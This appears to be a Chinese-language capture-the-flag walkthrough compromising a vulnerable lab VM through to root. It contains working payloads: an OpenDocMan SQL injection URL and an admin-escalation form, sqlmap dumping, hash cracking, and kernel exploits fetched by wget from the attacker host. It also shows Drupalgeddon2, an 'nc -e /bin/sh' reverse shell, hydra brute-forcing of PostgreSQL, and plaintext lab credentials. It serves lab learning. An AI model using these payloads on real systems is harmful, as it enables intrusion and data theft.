# mynew

AWVS漏扫
 4、继续页面信息收集 
端口转发 
靶机的5432然后hydra破解密码

#

1、nmap 10.211.55.0/24 -sP
Nmap scan report for localhost (10.211.55.42)

2、nmap全端口扫描

nmap -sC -sV -A -T5 10.211.55.42
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6
80/tcp   open  http    Apache httpd 2.4.7
6667/tcp open  irc     ngircd   ---未发现漏洞，待发现！


只开了22、80和6667端口，分别是ssh，Web服务器和IRC服务器。


3、AWVS漏扫

1）配置文件源代码泄露：
http://10.211.55.42/jabc/includes/database/database.inc
2）Drupal 远程代码执行 (SA-CORE-2018-002)
http://10.211.55.42/jabc/

AWVS漏扫发现存在Drupal漏洞！

** 4、继续页面信息收集**
在主页面模块点击：Documentation
进入后发现存在隐藏信息！由于安全原因隐藏了信息：/jabcd0cs/

http://10.211.55.42/jabcd0cs/

访问发现底部是：OpenDocMan 1.2.7
该页面存在OpenDocMan框架，查看是否存在EXP！


5、OpenDocMan攻击

OpenDocMan 是一个全功能的DMS文档管理系统,遵循 ISO 17025/IEC 标准。提供自动化安装脚本、自定义主题、插件、check in/out,分部门访问控制,文件调整,细粒度用户访问控制,强大的搜索功能。


AWVS扫描发现存在：跨站脚本攻击：XXS跨站脚本攻击
http://10.211.55.42/jabcd0cs/signup.php
http://10.211.55.42/jabcd0cs/forgot_password.php
http://10.211.55.42/jabcd0cs/index.php
这些信息陆续后面进行分析！


searchsploit OpenDocMan 1.2.7
cp /usr/share/exploitdb/exploits/php/webapps/32075.txt .


存在：CVE-2014-1945, CVE-2014-1946

--------
CVE-2014-1945：SQL注入
该漏洞是因为/ajax_udf.php脚本中存在add_value对HTTP GET参数请求验证不充分导致存在的漏洞。

sql 注入payload:
http://[host]/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9

--------
CVE-2014-1946：访问控制不当
由于在更新用户配置文件时/signup.php脚本中允许的操作验证不足，导致远程身份验证的攻击者可以将管理权限分配给当前帐户并获得对应用程序的完全控制权限。

payload:
-------
```

<form action="http://[host]/signup.php" method="post" name="main">
<input type="hidden" name="updateuser" value="1">
<input type="hidden" name="admin" value="1">
<input type="hidden" name="id" value="[USER_ID]">
<input type="submit" name="login" value="Run">
</form>


```
--------
防护手段：
Update to OpenDocMan v1.2.7.2

More Information:
http://www.opendocman.com/opendocman-v1-2-7-1-release/
http://www.opendocman.com/opendocman-v1-2-7-2-released/


1）CVE-2014-1945攻击利用
访问：
http://10.211.55.42/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9
发现存在sql注入！

手工注入：
查找odm_user数据库底下的username信息：将version()改为username
http://10.211.55.42/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,username,3,4,5,6,7,8,9%20from%20odm_user
发现guest、webmin用户！
继续查看密码：
http://10.211.55.42/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,password,3,4,5,6,7,8,9%20from%20odm_user
这里将username改为password即可发现hash值：
b78aae356709f8c31118ea613980954b



可以用通过sqlmap跑下：
爆库：
sqlmap -u "http://10.211.55.42/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --level=5 --risk=3

----
available databases [6]:
[*] drupal7
[*] information_schema
[*] jabcd0cs
[*] mysql
[*] performance_schema
[*] phpmyadmin
---- 发现六个数据库

爆表：
sqlmap -u "http://10.211.55.42/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --level=5 --risk=3 -D jabcd0cs --tables
----
Database: jabcd0cs
[15 tables]
+-------------------+
| odm_access_log    |
| odm_admin         |
| odm_category      |
| odm_data          |
| odm_department    |
| odm_dept_perms    |
| odm_dept_reviewer |
| odm_filetypes     |
| odm_log           |
| odm_odmsys        |
| odm_rights        |
| odm_settings      |
| odm_udf           |
| odm_user          |
| odm_user_perms    |
+-------------------+
----进入odm_user查看字段！

爆字段：
sqlmap -u "http://10.211.55.42/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --level=5 --risk=3 -D jabcd0cs --tables -T odm_user --columns
----
Database: jabcd0cs
Table: odm_user
[9 columns]
+---------------+------------------+
| Column        | Type             |
+---------------+------------------+
| department    | int(11) unsigned |
| Email         | varchar(50)      |
| first_name    | varchar(255)     |
| id            | int(11) unsigned |
| last_name     | varchar(255)     |
| password      | varchar(50)      |
| phone         | varchar(20)      |
| pw_reset_code | char(32)         |
| username      | varchar(25)      |
+---------------+------------------+
-----

爆破字段内容：
sqlmap -u "http://10.211.55.42/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --level=5 --risk=3 -D jabcd0cs --tables -T odm_user --dump



在线爆破：
https://hashkiller.co.uk/md5-decrypter.aspx
https://www.somd5.com/

获得账号密码：
webmin
webmin1980


6、SSH登录内核

ssh webmin@10.211.55.42
webmin1980

-------内核信息枚举：
python -m SimpleHTTPServer 8081
wget http://10.211.55.19:8081/linpeas.sh
wget http://10.211.55.19:8081/LinEnum.sh
chmod +x linpeas.sh
chmod +x LinEnum.sh
./linpeas.sh > 1.txt
./LinEnum.sh > 2.txt

-------
1）3.13.0-24-generic
2）vulnosadmin
3）Sudo version 1.8.9p5

---------------------
方法1：
#### 内核提权：
searchsploit linux 3.13.0
linux/local/37292.c
linux/local/37293.txt
cp /usr/share/exploitdb/exploits/linux/local/37292.c .
wget http://10.211.55.19:8081/37292.c
gcc 37292.c -o dayu
chmod +x dayu
./dayu
获得root权限！！！

或者用：cve-2021-4034
wget http://10.211.55.19:8081/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o dayu1
chmod +x dayu1
./dayu1

或者用：脏牛提权 （项目二内容）

cp /usr/share/exploitdb/exploits/linux/local/40847.cpp
python -m SimpleHTTPServer 8081
wget http://10.211.55.19:8081/40847.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dayu1 40847.cpp -lutil
chmod +x dayu1
./dayu1
ssh root@10.211.55.42
dirtyCowFun



---------------------
#### 方法2：Drupal 远程代码执行 (SA-CORE-2018-002)   CVE-2018-7600

https://github.com/dreadlocked/Drupalgeddon2
wget https://github.com/dreadlocked/Drupalgeddon2/blob/master/drupalgeddon2.rb
下载好drupalgeddon2.rb攻击脚本！

./drupalgeddon2.rb http://10.211.55.42/jabc

如果执行报错：

	2: from ./drupalgeddon2.rb:16:in `<main>'
	1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'

https://github.com/dreadlocked/Drupalgeddon2/issues/55  ---参考文章解决
-----  执行：sudo gem install highline  安装完后即可运行！

./drupalgeddon2.rb http://10.211.55.42/jabc   ---成功拿到shell
然后nc反弹个稳定的shell：
nc -vlp 7777
nc -e /bin/sh 10.211.55.19 7777
python -c 'import pty; pty.spawn("/bin/bash")'

---------------------
#### 方法3：

访问：
http://10.211.55.42/jabcd0cs/
webmin
webmin1980
成功登录！

后台可以上传php，但是无法解析！

-------------------
#### 方法4：3d建模
cd /home/webmin
post.tar.gz

开启python http服务下载：
tar -zxvf post.tar.gz   ---解压
解压开里面都是hydra源码！

netstat -tlp
postgresql：5432  开启着！

**ssh端口转发：**
ssh webmin@10.211.55.42 -L 5432:localhost:5432   ---ssh端口转发
webmin1980  
这时候本地就开启了5432端口！

------暴力破解方法1：hydra
/usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt

hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -P /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -s 5432 127.0.0.1 postgres -vvv
[5432][postgres] host: 127.0.0.1   login: postgres   password: postgres

------暴力破解方法2：MSF
msfconsole
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 127.0.0.1
[+] 127.0.0.1:5432 - Login Successful: postgres:postgres@template1

------------------

pg_dumpall用来提取我们可以访问的所有数据库：
PGPASSWORD="postgres" pg_dumpall -U postgres -h localhost -p 5432

发现账号密码：
vulnosadmin
c4nuh4ckm3tw1c3

ssh vulnosadmin@10.211.55.42
c4nuh4ckm3tw1c3

进来后ls发现目录存在：r00t.blend 3d建模

ssh root@10.211.55.42
ab12fg//drg
成功登录root权限！！！


总结：
OpenDocMan 1.2.7 cms sql注入（CVE-2014-1945）
Linux内核3.13.0 < 3.19(Ubuntu 12.04/14.04/14.10/15.04)-“overlayfs”本地提权
hydra爆破postgresql数据库用户名和密码
blender软件查看.blender后缀3d建模文件以寻找root用户ssh密码


-----------
知识拓展：
1）Drupal 7简单分析

searchsploit Drupal 7
gedit /usr/share/exploitdb/exploits/php/webapps/44449.rb

分析：
为了测试代码执行，脚本尝试回显随机生成的 8 个字符的字符串。然后，如果响应与发送的字符串匹配，则假定代码执行正在运行：470行
  random = (0...8).map { (65 + rand(26)).chr }.join

ruby 44449.rb http://10.211.55.42/jabc/    
成功获得shell！


2）awvs扫描分析

http://10.211.55.42/jabcd0cs/signup.php
http://10.211.55.42/jabcd0cs/forgot_password.php
http://10.211.55.42/jabcd0cs/index.php





























